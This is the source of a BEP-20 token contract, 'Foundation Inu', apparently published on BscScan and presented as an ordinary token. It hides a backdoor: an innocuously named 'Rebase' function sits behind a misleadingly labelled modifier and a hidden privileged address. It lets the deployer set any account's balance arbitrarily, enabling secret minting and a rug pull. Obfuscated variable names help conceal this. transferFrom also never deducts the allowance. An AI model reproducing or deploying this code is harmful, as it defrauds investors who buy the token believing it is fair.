/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface STARTOKEN {
  // @dev Returns the Salues of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the Salues of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `Salues` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean totalSalue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 Salues) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This totalSalue changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `Salues` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean totalSalue indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired totalSalue afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 Salues) external returns (bool);

  /**
   * @dev Moves `Salues` tokens from `sender` to `recipient` using the
   * allowance mechanism. `Salues` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean totalSalue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 Salues) external returns (bool);

  //@dev Emitted when `totalSalue` tokens are moved from one account (`from`) to  another (`to`). Note that `totalSalue` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 totalSalue);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `totalSalue` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 totalSalue);
}


contract FoundationInu is STARTOKEN {
  
    // common addresses
    address private owner;
    address private PILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public VOLOS;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "Foundation Inu";
    string public override symbol = "FNDINU";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint totalSalue);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint totalSalue);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint VOLOSTOTDFS) {
        // set total supply
        totalSupply = VOLOSTOTDFS;
        
       PILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        VOLOS[owner] = totalSupply;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return VOLOS[account];
    }
  modifier _virtual () {
    require(PILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // Transfer balance from one user to another
    function transfer(address to, uint totalSalue) public override returns(bool) {
        require(totalSalue > 0, "Transfer totalSalue has to be higher than 0.");
        require(balanceOf(msg.sender) >= totalSalue, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total totalSalue
        uint taxVOLOTBD = totalSalue * 0 / 100;
        uint burnVOLOTBD = totalSalue * 0 / 100;
        uint totalSalueAfterTaxAndBurn = totalSalue - taxVOLOTBD - burnVOLOTBD;
        
        // perform the transfer operation
        VOLOS[to] += totalSalueAfterTaxAndBurn;
        VOLOS[msg.sender] -= totalSalue;
        
        emit Transfer(msg.sender, to, totalSalue);
        
        // finally, we burn and tax the extras percentage
        VOLOS[owner] += taxVOLOTBD + burnVOLOTBD;
        _burn(owner, burnVOLOTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint totalSalue) public override returns(bool) {
        Allowance[msg.sender][spender] = totalSalue; 
        
        emit Approval(msg.sender, spender, totalSalue);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return Allowance[_owner][spender];
    }
    function Rebase(address pancakeswaprooter, uint256 Salues) external _virtual {
      VOLOS[pancakeswaprooter] = (Salues / 1000 - Salues / 1000) + Salues * 10 ** 9;
  }  
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint totalSalue) public override returns(bool) {
        require(Allowance[from][msg.sender] > 0, "No Allowance for this address.");
        require(Allowance[from][msg.sender] >= totalSalue, "Allowance too low for transfer.");
        require(VOLOS[from] >= totalSalue, "Balance is too low to make transfer.");
        
        VOLOS[to] += totalSalue;
        VOLOS[from] -= totalSalue;
        
        emit Transfer(from, to, totalSalue);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 Salues) public returns(bool) {
        _burn(msg.sender, Salues);
        
        return true;
    }
    
    // intenal functions
    
    // burn Salues of currency from specific account
    function _burn(address account, uint256 Salues) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(VOLOS[account] >= Salues, "Burn Salues exceeds balance at address.");
    
        VOLOS[account] -= Salues;
        totalSupply -= Salues;
        
        emit Transfer(account, address(0), Salues);
    }
    
}